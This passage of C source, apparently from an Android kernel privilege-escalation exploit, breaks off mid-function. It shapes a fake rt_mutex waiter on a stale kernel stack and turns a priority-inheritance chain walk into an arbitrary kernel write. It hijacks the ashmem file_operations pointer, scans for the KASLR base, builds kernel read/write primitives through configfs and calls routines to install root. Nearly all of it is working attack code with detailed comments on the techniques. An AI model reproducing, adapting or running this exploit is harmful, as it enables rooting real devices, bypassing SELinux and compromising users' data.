#include "common.h"

#define PSELECT_CFI_ROUTE_ATTEMPTS 24

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

/* Pointer-store mode (KS_WRITE_OFF): one aligned 8-byte store performed
 * by the PI-chain rb_erase() instead of the ashmem fops hijack. */
static int write_mode_active;
static uintptr_t write_mode_target;
static uint64_t write_mode_value;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
}

/* The punch target's *effective* priority, as the scheduler will see it at
 * rt_mutex_adjust_pi() time.  Reading /proc beats assuming NICE_TO_PRIO(nice):
 * this thread holds f_pi_chain while owner_thread blocks on it, so the kernel
 * keeps it PI-boosted and sched_setattr(nice=1) cannot raise its prio above
 * that boost.  Planting the boosted value is what makes the equal-priority
 * early return fire instead of walking a wild lock. */
static char plant_stat_line[512];
int plant_prio_used = -1;

int plant_victim_nice = -1;

/* /proc/self/task/<tid>/stat field 19 is task_nice(): the value
 * __sched_setscheduler() compares against attr->sched_nice. */
static int victim_nice(int tid) {
  char path[64];
  char buf[512];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) return -1;
  buf[n] = 0;
  char *p = strrchr(buf, ')');
  if (!p) return -1;
  p++;
  for (int field = 3; field <= 19; field++) {
    while (*p == ' ') p++;
    char *tok = p;
    while (*p && *p != ' ') p++;
    if (*p) *p++ = 0;
    if (!*tok) return -1;
    if (field == 19) return atoi(tok);
  }
  return -1;
}


int victim_effective_prio(int tid) {
  char path[64];
  char buf[512];
  snprintf(path, sizeof(path), "/proc/self/task/%d/stat", tid);
  int fd = open(path, O_RDONLY);
  if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) return -1;
  buf[n] = 0;
  snprintf(plant_stat_line, sizeof(plant_stat_line), "%s", buf);
  char *p = strrchr(buf, ')');
  if (!p) return -1;
  p++; /* skip ')' so field 3 (state) is the first token */
  /* state=3 ... priority=18 -> the 16th token after "(comm)" */
  for (int field = 3; field <= 18; field++) {
    while (*p == ' ') p++;
    char *tok = p;
    while (*p && *p != ' ') p++;
    if (*p) *p++ = 0;
    if (!*tok) return -1;
    if (field == 18) {
      /* This vendor kernel prints field 18 as p->prio - 100 (a plain nice-0
       * process shows 20, nice 5 shows 25), not the stock nice+20 view as
       * p->prio.  Convert back to the value rt_mutex_adjust_pi() compares. */
      return atoi(tok) + 100;
    }
  }
  return -1;
}

/* Post-punch evidence that the chain really walked on our fake page:
 * the chain's first completion writes ashmem_misc.fops = fake_fops, and the
 * configfs read path can only read the slot back through that fake table.
 * A gate early return leaves the real fops in place and this returns 0. */
int punch_walk_marker(void) {
  int fd = open_ashmem_device();
  uint64_t v = 0;
  ssize_t n;
  if (fd < 0) {
    return 0;
  }
  n = configfs_read_once(fd, data_addr(ASHMEM_MISC_FOPS), &v, sizeof(v));
  close(fd);
  return n == (ssize_t)sizeof(v) && v == fake_fops;
}

void do_pselect_fake_lock_route(void) {
  int plant_probe = getenv("KS_PLANT_PROBE") != NULL;
  if (!plant_probe && (!page_base || !fake_lock || !fake_fops)) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  int walk_touched = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1 && !plant_probe) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    /* Encode the complete 0x50-byte struct rt_mutex_waiter at T-0x190:
     * task=fake_task and lock=fake_lock so rt_mutex_adjust_prio_chain()
     * follows fake_task->pi_blocked_on into the controlled page.  The
     * previous encoding started one word low, so the walk read
     * task=fake_lock and lock=130 and died in spin_trylock. */
    static fd_set route_in;    fd_set *inp = &route_in;
    static fd_set route_out;    fd_set *outp = &route_out;
    static fd_set route_ex;    fd_set *exp = &route_ex;
    prepare_punch_select_fdsets(inp, outp, exp);
    open_slide_selected_fds(inp, outp, exp, high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

#if defined(SIGRET_WAITER_LANE) && !defined(PLANT_PSELECT)
    /* Deterministic plant.  rt_sigreturn's 512-byte fpsimd copy writes the
     * complete struct rt_mutex_waiter at T-0x190 (target.h
     * SIGRET_WAITER_LANE); pselect's readiness bitmap can only ever write
     * word 0, which is why every previous punch walked a partial object. */
    atomic_store(&plant_ready, 0);
    if (plant_shallow_done) {
      /* Handler already installed and the waiter planted from the
       * futex caller's frame; do not re-plant from this deep frame. */
      goto plant_installed;
    }
    if (!plant_waiter_install()) {
      cfi_last_step = 38;
      cfi_last_errno = errno;
      atomic_store(&punch_consume_go, 0);
      break;
    }
    errno = 0;
    int probe_prio = PSELECT_CONSUMER_NICE + 120;
    if (getenv("KS_PLANT_SKIP")) {
      /* Control: punch the stale victim with the futex frame exactly as the
       * kernel left it.  Surviving means pi_blocked_on was already cleared;
       * rebooting means the walk followed a real stale structure. */
    } else if (plant_probe) {
      /* Placement probe: an equal-priority waiter makes rt_mutex_adjust_pi()
       * return before it reads waiter->lock, so a survival proves the plant
       * landed at the stale-waiter address and nothing else. */
      int target_prio = victim_effective_prio(atomic_load(&waiter_tid));
      if (target_prio > 0) {
        /* The punch can only lower the target's effective priority, never
         * raise it above NICE_TO_PRIO(nice): a live PI boost wins. */
        probe_prio = target_prio < PSELECT_CONSUMER_NICE + 120
                         ? target_prio
                         : PSELECT_CONSUMER_NICE + 120;
      }
      /* The punch runs set_user_nice() first, and that sets
       * p->prio = effective_prio(p) = NICE_TO_PRIO(nice) for a CFS task,
       * discarding any PI boost.  So the equal-priority early return only
       * fires for the post-punch value; KS_PLANT_PRIO overrides the guess. */
      const char *pp = getenv("KS_PLANT_PRIO");
      if (pp && *pp) {
        probe_prio = atoi(pp);
      }
      plant_prio_used = probe_prio;
      plant_victim_nice = victim_nice(atomic_load(&waiter_tid));
      const char *zr = getenv("KS_PLANT_ZERO");
      if (zr) {
        int lo = 0, hi = 0;
        if (sscanf(zr, "%d:%d", &lo, &hi) == 2) {
          plant_waiter_zero_range((uint32_t)probe_prio, lo, hi);
        } else {
          plant_waiter((uint64_t)0, (uint64_t)0, probe_prio);
        }
      } else if (getenv("KS_PLANT_FILL")) {
        /* Uniform fill: every lane carries the target priority, so the
         * equal-priority early return happens whichever lane overlays the
         * stale waiter.  Survival proves the plant covers the waiter. */
        plant_waiter_uniform((uint32_t)probe_prio);
      } else {
        plant_waiter(0, 0, probe_prio);
      }
    } else if (getenv("KS_PAGE_PROBE")) {
      /* Placement only: both the lock and the task live in the fake page, so
       * the walk never needs data_addr()/KASLR and a survival means the SKB
       * page really is at the leaked slab base.  A panic means it is not. */
      plant_waiter(fake_task, fake_lock, FAKE_WAITER_PRIO);
    } else if (getenv("KS_WRITE_OFF")) {
      /* One aligned pointer store at image offset KS_WRITE_OFF.  Default is
       * the linear-map alias (no KASLR needed); KS_WRITE_VIA=va uses the real
       * virtual address and therefore needs KS_KASLR_BASE.
       *
       * rb_erase() stores rb_right at parent->rb_right (parent + 0x8) and then
       * writes pc into *child, so the stored value may only be 0 or a writable
       * kernel pointer.  A zero value also keeps the node red, which skips
       * __rb_erase_color() entirely. */
      const char *off_s = getenv("KS_WRITE_OFF");
      uintptr_t off = (uintptr_t)strtoull(off_s, NULL, 0);
      uint64_t val = 0;
      const char *val_s = getenv("KS_WRITE_VAL");
      if (val_s && *val_s) {
        val = strtoull(val_s, NULL, 0);
      }
      const char *via = getenv("KS_WRITE_VIA");
      uintptr_t target = (via && !strcmp(via, "va"))
                             ? kaslr_image_addr(KIMAGE_TEXT_BASE + off)
                             : data_addr(KIMAGE_TEXT_BASE + off);
      write_mode_active = 1;
      write_mode_target = target;
      write_mode_value = val;
      pr_info("KS_WRITE target=%016zx val=%016llx via=%s\n", target,
              (unsigned long long)val,
              (via && *via) ? via : "linear");
      plant_waiter_fake(fake_task, fake_lock, FAKE_WAITER_PRIO,
                        (target - 8) | (val ? 1 : 0), val, 0);
    } else if (getenv("KS_PLANT_ALL")) {
      /* Placement probe: every lane carries fake_lock, so the walk
       * reads our lock no matter which byte offset the stale waiter
       * starts at.  A fault other than +0x304 (or a clean return)
       * proves the plant landed. */
      pr_info("KS_PLANT_ALL lock=%016zx\n", (size_t)fake_lock);
      plant_waiter_all(fake_lock);
    } else {
      /* Real route: the pi_tree_entry triple is the arbitrary-write payload.
       * rb_erase() of fake_w0's pi_tree_entry runs __rb_change_child() with
       * parent = (pc & ~3) and child = rb_right; because rb_left is 0 it
       * stores child at parent->rb_right == parent + 0x8 (verified in the
       * shipped image: the out-of-line rb_erase_cached stores to [parent,#8]
       * or [parent,#16] only).  So parent = misc_fops - 8 installs fake_fops
       * in ashmem_misc.fops with one aligned store. */
      plant_waiter_fake(fake_task, fake_lock, FAKE_WAITER_PRIO,
                        (data_addr(ASHMEM_MISC_FOPS) - 8) | 1, fake_fops, 0);
    }
plant_installed:
    if (plant_delivery_failed) {
      pr_error("plant delivery failed; refusing punch to avoid a wild waiter "
               "walk\n");
      cfi_last_step = 39;
      cfi_last_errno = 0;
      atomic_store(&punch_consume_go, 0);
      break;
    }
    /* Nothing here may log: pr_info() is exlog_writef(), i.e. write()+fsync(),
     * which enters the kernel and reuses the stack that now holds the planted
     * waiter.  The evidence is printed after the punch instead. */
    atomic_store(&plant_ready, 1);
    /* No syscall may run on this thread until the punch completes: any
     * kernel entry reuses the stack that holds the planted waiter. */
    int ret = 0;
    int saved_errno = 0;
#else
    struct timespec timeout = {
      .tv_sec = 3,
      .tv_nsec = 0,  /* must outlast the consumer delay by a wide margin:
                      * if pselect returns first, the kernel stack is reused
                      * and the encoded waiter is gone before the punch. */
    };
    struct timespec *timeoutp = &timeout;

    if (getenv("KS_DUMP_WAITER")) {
      const char *nm[10] = {"tree_pc", "tree_r", "tree_l", "pi_pc", "pi_r",
                            "pi_l", "task", "lock", "prio", "dl"};
      for (int w = 0; w < 10; w++) {
        int gw = slide_pselect_global_word(w);
        pr_info("KS_WAITER %s word=%d global=%d value=%016zx\n", nm[w], w, gw,
                (size_t)slide_pselect_get_global_word(inp, outp, exp,
                                                      PSELECT_ROUTE_NFDS / 64,
                                                      gw));
      }
      pr_info("KS_WAITER shift=%d expected_lock=%016zx\n",
              slide_pselect_waiter_shift(), (size_t)fake_lock);
    }
    {
      /* Does this call even reach the stack path?  SELECT_STACK_ALLOC is 256
       * bytes in 4.19: six sets of FDS_BYTES(nfds) must fit, otherwise
       * core_sys_select() kvmalloc()s and the shaped waiter never lands on the
       * kernel stack.  A closed fd also clears its result bits, which rewrites
       * the encoded words we are about to depend on. */
      size_t bytes_per_set = ((size_t)PSELECT_ROUTE_NFDS + 7) / 8;
      size_t total = bytes_per_set * 6;
      int closed = 0;
      for (int probe = 0; probe < PSELECT_ROUTE_NFDS; probe++) {
        if (fcntl(probe, F_GETFD) < 0) closed++;
      }
      pr_info("KS_PSELECT_SHAPE nfds=%d bytes_per_set=%zu total=%zu path=%s "
              "closed_fds=%d stack_alloc=256\n",
              (int)PSELECT_ROUTE_NFDS, bytes_per_set, total,
              total <= 256 ? "stack" : "kvmalloc", closed);
      if (closed) {
        pr_warning("KS_PSELECT_SHAPE %d fds below nfds are closed; their "
                   "result bits are zero and the encoded waiter is corrupt\n",
                   closed);
      }
    }

    /* The encoded waiter is now in the fd-set copy, so the consumer
     * may punch.  Without this the punch is skipped and the walk is
     * never exercised. */
    atomic_store(&plant_ready, 1);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, inp, outp, exp, timeoutp, NULL);
    int saved_errno = errno;
#endif
    /* CRITICAL: the fd-bitmap-shaped stale waiter still lives on this
     * thread's kernel stack below SP. Any syscall (write/pr_info) before
     * the consumer punch lands would clobber it, and clearing go now
     * would make the consumer miss the window entirely. Hold go=1 and
     * busy-wait (yield only) until the punch has completed, exactly like
     * the validated slide route. */
    /* The PI chain walk over the fake waiter/lock/task can legitimately
     * take seconds in-kernel; measured runs show sched_setattr returning
     * AFTER the waiter's old spin caps expired. Wait unboundedly for the
     * punch to complete: the syscall provably returns, and bailing early
     * both logs stale values and skips try_cfi_stage via route_signal. */
    long punch_wait = 0;
    for (volatile long spin = 0; spin < 32000000000L; spin++, punch_wait++) {
      if (atomic_load(&consumer_calls) > 0) break;
      if (punch_wait == 400000000L) {
        pr_warning("punch first wait timeout calls=%d\n",
                   atomic_load(&consumer_calls));
      }
      __asm__ volatile("yield" ::: "memory");
    }
    for (volatile long spin2 = 0; spin2 < 64000000000L; spin2++, punch_wait++) {
      if (atomic_load(&consumer_calls) > 0 &&
          atomic_load(&consumer_inflight) == 0) {
        break;
      }
      if (punch_wait == 800000000L) {
        pr_warning("punch completion wait timeout calls=%d inflight=%d\n",
                   atomic_load(&consumer_calls),
                   atomic_load(&consumer_inflight));
        break;
      }
      __asm__ volatile("yield" ::: "memory");
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    if (plant_probe) {
      /* Printed only now: between the plant and the punch this thread must
       * not enter the kernel, and every pr_* is a write()+fsync(). */
      pr_info("plant probe prio=%d ", probe_prio);
      pr_info("plant stat %s", plant_stat_line);
      pr_info("plant fpsimd ret=%ld hits=%d mismatch=%d q0=%016llx "
              "lane2=%016llx ",
              plant_adjtimex_ret, (int)plant_hits, plant_fp_mismatch,
              (unsigned long long)plant_fp_readback[0],
              (unsigned long long)plant_fp_readback[2]);
      int after_prio = victim_effective_prio((int)syscall(SYS_gettid));
      pr_info("plant post punch prio=%d ", after_prio);
      pr_success("KS_PLANT_PROBE verdict=%s calls=%d success=%d last_ret=%d "
                 "last_errno=%d\n",
                 (calls > 0 && success > 0) ? "PLANTED" : "REJECTED", calls,
                 success, atomic_load(&consumer_last_ret),
                 atomic_load(&consumer_last_errno));
      cfi_last_step = 0;
      route_verified = 1;
      break;
    }
    if (write_mode_active) {
      pr_success("KS_WRITE done calls=%d success=%d target=%016zx "
                 "val=%016llx\n",
                 calls, success, write_mode_target,
                 (unsigned long long)write_mode_value);
      const char *ver = getenv("KS_WRITE_VERIFY");
      if (ver && !strcmp(ver, "selinux")) {
        int vfd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        char vb[16];
        memset(vb, 0, sizeof(vb));
        ssize_t vn = vfd >= 0 ? read(vfd, vb, sizeof(vb) - 1) : -1;
        if (vfd >= 0) {
          close(vfd);
        }
        pr_success("KS_WRITE verify=selinux ret=%zd val=%s\n", vn, vb);
      } else if (ver && !strcmp(ver, "kallsyms")) {
        int kfd = open("/proc/kallsyms", O_RDONLY | O_CLOEXEC);
        char kb[160];
        memset(kb, 0, sizeof(kb));
        ssize_t kn = kfd >= 0 ? read(kfd, kb, sizeof(kb) - 1) : -1;
        if (kfd >= 0) {
          close(kfd);
        }
        if (kn > 0) {
          kb[strcspn(kb, "\n")] = 0;
        }
        pr_success("KS_WRITE verify=kallsyms ret=%zd first=%s\n", kn, kb);
      }
      cfi_last_step = 0;
      route_verified = 1;
      break;
    }
    uint32_t leak = ks_leak_readback();
    walk_touched = ks_leak_walk_touched;
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d "
            "delay=%d last_sched_ret=%d last_sched_errno=%d "
            "walk_touched=%d leak=%08x\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            atomic_load(&consumer_last_ret),
            atomic_load(&consumer_last_errno), walk_touched, leak);

    int route_signal = calls > 0 && success > 0;
    if (route_signal && !walk_touched) {
      cfi_last_step = 36;
      cfi_last_errno = 0;
      pr_error("pselect walk probe miss attempt=%d/%d; refusing cfi probe\n",
               route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS);
    } else if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    /* A step=4 failure means the fops readback at data_addr did not see
     * fake_fops: the selected delta candidate is wrong.  The punch walk
     * already wrote one qword to the wrong linear address; retrying with
     * the same delta would corrupt more, so stop the route here. */
    if (cfi_last_step == 4) {
      pr_error("delta candidate failed step=4 (fops readback mismatch); "
               "stopping route to avoid corrupting writes\n");
      break;
    }
    if (route_verified || cfi_dirty_seen || !route_signal ||
        (route_signal && !walk_touched)) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
#ifdef CFGOPS_4_19_STYLE
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#else
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#endif
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

static int scan_kaslr_base(int fd) {
  /* Scan the kernel text region for the ashmem fops table.  The open
   * pointer at kaslr_base + ASHMEM_FOPS_OFF + FOPS_OPEN_OFF must satisfy
   * open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) == kaslr_base, which is a
   * strong self-consistency check (a random read won't produce it). */
  const uintptr_t scan_step = 0x200000; /* 2MB (SWAPPER_BLOCK_SIZE) */
  const uintptr_t scan_max = 0x200000000ULL; /* 8GB slide range */
  for (uintptr_t base = KIMAGE_TEXT_BASE;
       base < KIMAGE_TEXT_BASE + scan_max; base += scan_step) {
    kaslr_base = base;
    uintptr_t fops_addr = kaslr_base + ASHMEM_FOPS_OFF;
    uint64_t open_ptr = kernel_read64(fd, fops_addr + FOPS_OPEN_OFF);
    if (!is_kernel_ptr(open_ptr))
      continue;
    if (open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE) != base)
      continue;
    pr_info("kaslr scan hit base=%016llx slide=%016llx\n",
            (unsigned long long)base,
            (unsigned long long)(base - KIMAGE_TEXT_BASE));
    return 1;
  }
  kaslr_base = 0;
  return 0;
}

int leak_kernel_base(int fd) {
  /* When slide didn't run (alioth pselect route is dead), kaslr_base is
   * zero; scan the text region for the ashmem fops table instead. */
  if (!kaslr_base) {
    if (!scan_kaslr_base(fd)) {
      kaslr_step = 20;
      return 0;
    }
  }
  /* The p0 phys|PAGE_OFFSET data alias is invalid when the vendor kernel
   * randomizes the linear map; kaslr_base is already known here because
   * slide_leak_kernel_base() (pselect route, VA-only) runs first. */
  kaslr_fops_alias = kaslr_base + ASHMEM_FOPS_OFF;
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  /* calibrate the real linear map base from memstart_addr:
   * VA(phys) = phys - memstart_addr + PAGE_OFFSET  =>  base = PAGE_OFFSET - memstart */
  uint64_t memstart = kernel_read64(fd, kaslr_base + MEMSTART_ADDR_OFF);
  if (memstart) {
    extern uintptr_t g_direct_map_base;
    g_direct_map_base = (uintptr_t)((int64_t)P0_PAGE_OFFSET - (int64_t)memstart);
    pr_success("direct map calibrated memstart=%016llx base=%016zx "
               "(mm phys would be %016llx)\n",
               (unsigned long long)memstart, g_direct_map_base,
               (unsigned long long)(0xffffffcca4a2f800ULL - g_direct_map_base));
  }
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  page_image_report(fd, "post-hijack");

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  if (getenv("KS_W1_TEST")) {
    uint64_t original_fops = canon_addr(ASHMEM_FOPS);
    ssize_t restore = configfs_write_once(
        fd, misc_fops, &original_fops, sizeof(original_fops));
    cfi_restore_ret = restore;
    uint64_t after = 0;
    ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
    fops_after = after;
    uint64_t null_owner = 0;
    ssize_t owner =
      configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
    cfi_owner_ret = owner;
    SYSCHK(close(fd));

    if (restore == (ssize_t)sizeof(original_fops) &&
        ra == (ssize_t)sizeof(after) &&
        after == original_fops &&
        owner == (ssize_t)sizeof(null_owner)) {
      cfi_last_step = 0;
      cfi_last_errno = 0;
      atomic_store(&cfi_stage_done, 1);
      pr_success("KS_W1_TEST primitive ok write=%zd read=%zd restore=%zd "
                 "after=%016llx owner=%zd\n", cfi_write_ret, cfi_read_ret,
                 restore, (unsigned long long)after, owner);
      return 1;
    }
    cfi_last_step = 35;
    cfi_last_errno = errno;
